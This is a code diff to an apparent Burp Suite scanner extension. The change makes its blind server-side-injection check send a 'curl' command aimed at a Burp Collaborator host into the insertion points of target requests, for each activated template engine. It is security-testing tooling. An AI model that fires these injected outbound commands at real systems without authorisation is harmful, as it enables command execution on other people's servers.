@@ -28,27 +28,32 @@ public class Attacker {
     private Logging logger;
     private Http http;
     private CollaboratorClient collaboratorClient;
-    private Engines engines = new Engines();;
+    private Engines engines;
+    public String cmd = "curl";
 
-    public Attacker(MontoyaApi api) {
+    public Attacker(MontoyaApi api, Engines engines) {
         this.api = api;
         this.logger = this.api.logging();
         this.http = this.api.http();
         this.collaboratorClient = this.api.collaborator().createClient();
+        this.engines = engines;
     }
 
     public List<AuditIssue> blindAttack(HttpRequestResponse baseRequestResponse, AuditInsertionPoint auditInsertionPoint) {
         List<ExecutedAttack> executedAttacks = new ArrayList<>();
 
         for (Engine engine : engines.getEngines()) {
-            CollaboratorPayload collaboratorPayload = this.collaboratorClient.generatePayload();
-            String collaboratorURL = collaboratorPayload.toString();
-            this.logger.logToOutput("Generated collaborator URL: " + collaboratorURL);
-            this.logger.logToOutput("Engine Name: " + engine.name);
-            String payload = engine.payload.replace("[PAYLOAD]", collaboratorURL);
+            if(engine.isActivated) {
+                CollaboratorPayload collaboratorPayload = this.collaboratorClient.generatePayload();
+                String collaboratorURL = collaboratorPayload.toString();
+                this.logger.logToOutput("Generated collaborator URL: " + collaboratorURL);
+                this.logger.logToOutput("Engine Name: " + engine.name);
+                String command = this.cmd + " " + engine.name + "." + collaboratorURL;
+                String payload = engine.payload.replace("[PAYLOAD]", command);
 
-            this.logger.logToOutput("Sending payload: " + payload + " to insertion point " + auditInsertionPoint.name());
-            executedAttacks.add(attackWithPayload(baseRequestResponse, auditInsertionPoint, payload, collaboratorPayload, engine));
+                this.logger.logToOutput("Sending payload: " + payload + " to insertion point " + auditInsertionPoint.name());
+                executedAttacks.add(attackWithPayload(baseRequestResponse, auditInsertionPoint, payload, collaboratorPayload, engine));
+            }
         }
 
         List<Interaction> interactions = this.collaboratorClient.getAllInteractions();
